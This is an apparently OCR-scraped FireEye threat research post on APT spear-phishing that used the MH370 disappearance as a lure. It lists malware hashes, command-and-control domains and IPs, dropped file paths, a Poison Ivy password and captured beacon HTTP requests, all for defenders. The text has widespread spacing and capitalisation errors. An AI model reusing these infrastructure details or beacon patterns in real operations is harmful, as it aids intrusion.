{
    "title": "spear phishing the news cycle_ apt actors leverage interest in the disappearance of malaysian flight mh 370 _ fireeye inc",
    "text": " PREVIOUS POST nEXT POSTThreat Research Spear Phishing the news Cycle: aPT acto rs Leverage Interest in the Di sappearance of Malay sian Flight M H 370 March 25, 2014 | by ned Moran, alex Lan stein While many a dvanced persistent threat (aPT) g roups have inc reasingly emb raced strategic Web comp romise as a malware delivery vecto r, groups also contin ue to rely on spear-phishing email s that leve rage pop ular news stories. The recent tragic disappearance of flight M H 370 is no exception. Thi s post will examine m ultiple instances from different threat groups, all using spear-phishing me ssages and leveraging the disappearance of Flight 370 as a lure to convince the ta rget to open a malicio us attachment. “admin@338 ” Targets an aPaC Gove rnment an d U.S. Think Tank The first spear phish from group “admin@338 ” was sent to a fo reign gove rnment in the a sian Pacific region on March 10, 2014 – just two days after the flight disappeared. The th reat acto rs sent a spear-phishing email with an attachment title d, “Malay sian airlines MH370.doc” (MD 5: 9c43a26fe4538a373b7f5921055dd eae). altho ugh threat acto rs often incl ude some sort of “decoy content” upon successful exploitation (that i s, a document representing what the recipient expecte d to open), in thi s case, the user is simply shown a blank document. The attachment dropped a Poison Ivy variant into the path C:\\DOCUM E~1\\admin\\LOCaLS~ 1\\Temp\\kav.exe (MD5: 9dbe491b7d614251e75fb19e8b1b0d0d ), which, in t urn, beacone d outbound to www .verizon.proxydns[.]com. Thi s Poison Ivy variant was configured with the connection pa ssword “wwws t@admin.” The aPT g roup we refer to as admin@338  has previously used Poison Ivy implant s with this same pa ssword. We document the a dmin@338  group’s activitie s in our Poison Ivy: assessing Damage an d Extracting Intelligence  paper. Further, the domain www .verizon.proxydns[.]com p reviously resolved to the following IP addresses that have al so been used by the a dmin@338  group: IP Address First Seen Last Seen 103.31.241.110 2013-08-27 2013-08-28 174.139.242.19 2013-08-28 2013-08-31 58.64.153.157 2013-09-03 2014-03-07 59.188.0.197 2014-03-07 2014-03-19 a second targeted attack att ributed to the same admin@338  group was sent to a p rominent U.S.-ba sed think tank on Ma rch 14, 2014. This spear phish containe d an attachment that dropped “Malay sian airlines MH370 5m Video.exe” (MD 5: b869d c959d aac3458b6a81bc006e5b97). The mal ware sample was crafted to appea r as though it was a Flash video, by bin ding a Fla sh icon to the malicio us executable. Interestingly, in thi s case, the mal ware sets its persistence in the no rmal “Run” registry location, b ut it tries to auto start the payloa d from the disk directory “c:\\programdata”, which doesn’t exist until Win dows 7, so a simple reboot would mitigate thi s threat on Win dows XP. Thi s suggests the threat acto rs did not pe rform quality control on the mal ware or were simply ca reless. We detect thi s implant a s Backdoor.aPT.Win HTTPHelper. The admin@338  group discussed above ha s used variants of this same mal ware family in previous targeted attacks. This specific implant beacon s out to dpmc.dynssl[.]com:44 3 and www .dpmc.dynssl[.]com: 80. The domain dpmc.dynssl[.]com resolved to the follo wing IPs: IP Address First Seen Last Seen 31.193.133.101 2013-11-01 2013-11-29 58.64.153.157 2014-01-10 2014-03-08 59.188.0.197 2014-03-14 2014-03-17 139.191.142.168 2014-03-17 2014-03-19 The www .dpmc.dynssl[.]com domain resolved to follo wing IPs: IP Address First Seen Last Seen 31.193.133.101 2013-10-30 2013-11-29 58.64.153.157 2014-01-10 2014-03-08 59.188.0.197 2014-03-14 2014-03-18 139.191.142.168 2014-03-17 2014-03-19 note that the www .verizon.proxydns[.]com domain used by the Poi son Ivy discussed above al so resolved to both 58.64.153.157 and 59.188.0.197 during the same time f rame as the Back door.aPT.Win HTTPHelper comman d and control (CnC) locate d at dpmc.dynssl[.]com an d www .dpmc.dynssl[.]com. In addition to the above activity att ributed to the a dmin@338  group, a number of othe r malicio us documents abusing the mi ssing Flight 370 story were also seen in the wild. Other threat groups likely sent the se other documents. The naikon L ures On March 9, 2014, a malicio us executable entitle d the “Sea rch for MH370 continues as report says FBI agents on way to offe r assistance.p df .exe“ (MD 5: 52408bffd295 b3e69e983be9bdcdd6aa) was seen circulating in the wild. This sample beacon s to the CnC net.google reader[.]pw:443. We have i dentified this sample, via fo rensic analy sis, as Backdoor.aPT.naikon. It uses a standard techniq ue of changing it s icon to make it appea r to be a PDF, in o rder to lend to its credibility. This same icon, embe dded as a PE Resource, has been used in the follo wing recent samples: MD5 Import hash CnC Server fcc59add998760b76f009b1fdfacf840 e30e07abf1633e10c2d1fbf34e9333d6 ecoh.oicp[.]net 018f762da9b51d7557062548d2b91eeb e30e07abf1633e10c2d1fbf34e9333d6 orayjue.eicp[.]net fcc59add998760b76f009b1fdfacf840 e30e07abf1633e10c2d1fbf34e9333d6 ecoh.oicp[.]net:443 498aaf6df71211f9fcb8f182a71fc1f0 a692dca39e952b61501a278ebafab97f xl.findmy[.]pw a093440e75ff4fef256f5a9c1106069a a692dca39e952b61501a278ebafab97f xl.findmy[.]pw 125dbbb742399ec2c39957920867ee60 a692dca39e952b61501a278ebafab97f uu.yahoomail[.]pw 52408bffd295b3e69e983be9bdcdd6aa a692dca39e952b61501a278ebafab97f net.googlereader[.]pw This malware leverages “pdfbind” to add a PDF into it self, as can be seen in the debugging strings, and when launched, the mal ware also presents a decoy document to the ta rget: The Plat 1 Lures On March 10, 2014, we observed anothe r sample that exploite d CVE-2012 -0158 , titled “MH370班机可以人 员身份信 息.doc” (MD 5: 4ff2156c74e0a36d16 fa4aea29f38ff8), which roughly translates to “MH370 Flight Pe rsonnel Identity Information”. The mal ware that is dropped by the malicio us Word document, which we detect as Trojan.aPT.Plat 1, begins to beacon to 59.188.253.216 via TCP ove r port 80. The decoy document opene d after exploitation i s blank. The malicio us document dropped the follo wing implant s: C:\\Documents and Settings\\Administrator\\Application Data\\Intel\\ResN32.dll (MD5: 2437f6c333cf61db53b596d192cafe64) C:\\Documents and Setting s\\administrator\\application Data\\ Intel\\~y. dll (MD5: d8540b23e52892 c6009 fdd5812 e9c597) The implant s dropped by this malicio us document both incl uded unique PDB path s that can be used to find related samples. These paths were as follows: E:\\Work\\T5000\\T5 Install\\ResN\\Release\\ResN32.pdb F:\\WORK\\PROJ ECT\\T5 Install\\InstDll\\Relea se\\InstDll.pdb This malware family was also described in more detail here. The Mongall/Sake r Lures anothe r sample leve raging the mi ssing airliner theme was seen on Ma rch 12, 2014. The malicio us document exploite d CVE-2012 -0158  and was titled, “Missing Malay sia airlines Flight 370.doc” (MD 5: 467478fa0670fa8576b21d860 c1523c6). altho ugh the exten sion looke d like a Mic rosoft Office .DOC file, it was actually an . HTML application ( HTa) file. Once the exploit i s successful, the payloa d makes itself persistent by adding a Win dows shortcut (.LnK) file pointing to the mal ware in the “Sta rtup” folder in the start menu. It beacon s outbound to come r4s.minidns[.]net:8070. The net work callback patte rn, shown below, is known by researchers as “Mongall” o r “Saker”: GET /3010FC080[REDACTED] HTTP/1.1 User-agent: Mo zilla/4.0 (compatible; MS IE 6.0; Wis nT 5.0; .nET CLR 1.1.4322) Host: come r4s.minidns.net:8070 Cache-Cont rol: no-cache The sample al so drops a decoy file calle d “aa.doc” into the temp fol der and displays the decoy content shown below: The “Tranchulas” Lures On March 18, 2014 a sample entitle d “Malysia airline MH370 hijacke d by Paki stan.zip” was sent as a ZIP file (MD 5: 7dff5c4ae1b1fea7ecbf7ab7 87da3468) that containe d a Windows screensaver file disguised as a PDF (MD 5: b03edbb264aa0c980ab29746526888 76). The Z IP file was hosted on 199.91.173.43. This IP address was previously used to host malicio us files. The screen saver file drops “winservice.exe” (MD 5: 828d 4a66487d25b413cb19ef8ee7c783) which begin s beaconing to 199.91.173.45. This IP address was previously used to host a file entitle d “obl_leake d_report.zip” (MD5: a4c7c7 9308139 a7ee70aacf68bba814f). The initial beacon to the comman d-and-control server is as follows: POST /path_active.php?compname=[HOSTNAME]_[USERNAME] HTTP/1.1 Host: 199.91.173.45 accept: */* Content-Length: 11 Content-Type: application/x- www -form-urlencoded This same cont rol server was used in previous activity . The Page Campaign a final malicio us document was seen abusing the mi ssing Flight 370 story on Ma rch 18, 2014. This document exploite d CVE-2012 -0158  and was entitled “MH370 PM statement 15.03.14 - FInaL.DOC” (MD 5: 5e8d64185737f835318 489fda46f31a6). This document dropped a Back door.aPT.Page implant an d connecte d to 122.10.89.85 on both po rt 80 and 443. The initial beacon t raffic ove r port 80 is as follows: GET /18110143/page_32180701.html HTTP/1.1 accept: */* Cookie: XX= 0; BX=0 User-agent: Mo zilla/4.0 (compatible; MS IE 8.0; Win32) Host: 122.10.89.85 Connection: Keep-alive Cache-Cont rol: no-cache Pragma: no-cache Conclusion While many aPT acto rs have a dopted strategic Web comp romise as a delivery vecto r, it is apparent that spear phishing via email-ba sed attachment s or links to zip files remain pop ular with many th reat acto rs, especially when paired with lures discussing current media event s. network defenders should incorporate the se facts into thei r user training p rograms and be on heightene d alert for regular spear-phishing campaign s, which leve rage topic s dominating the ne ws cycle. acknowledgement: We thank nart Villene uve and Patrick Olsen for their support, research, and analysis on these findings.  Email Up dates Information an d insight on to day's advanced threats from FireEye. SHaRE Recent Po sts 17 Mar 2020 16 Mar 2020 09 Mar 2020 RSS FEED: STaY CO nnECTED  First name Last name Email address Company name Threat Research Blog FireEye Stories Blog Industry Perspective s Blog Yes, I would like to receive communication s from FireEye. Please read more about our information collection an d use. SUBSCR IBE Six Fact s about address Space Layout Randomization on Windows  They Come in the night: Ransomware Deployment T rends  Crescendo: Real Time Event Vie wer for macOS    Home  FireEye Blog s Threat Research  March 2014 Threat Research Blog Po sts  Spear Phishing the news Cycle: aPT acto rs Leverage...     Company Why Fi reEye? Customer Stories Careers Certification s and Compliance Investor Relation s Supplier Documents news and Events newsroom Press Releases Webina rs Events awards and Honors Email Preferences Technical S upport Incident? Report Security Issue Contact S upport Customer Portal Communities Documentation Po rtal FireEye Blog s Threat Research FireEye Stories Industry Perspective s Threat Map View the Late st Threats Contact U s +1 877-347-3393   Stay Connecte d  Copyright   2020  FireEye, Inc. all rights reserved.  Privacy & Cookie s Policy  | Privacy Shiel d | Legal Doc umentationSite Lang uage English Solutions Services Customers Partners Resources Company  "
}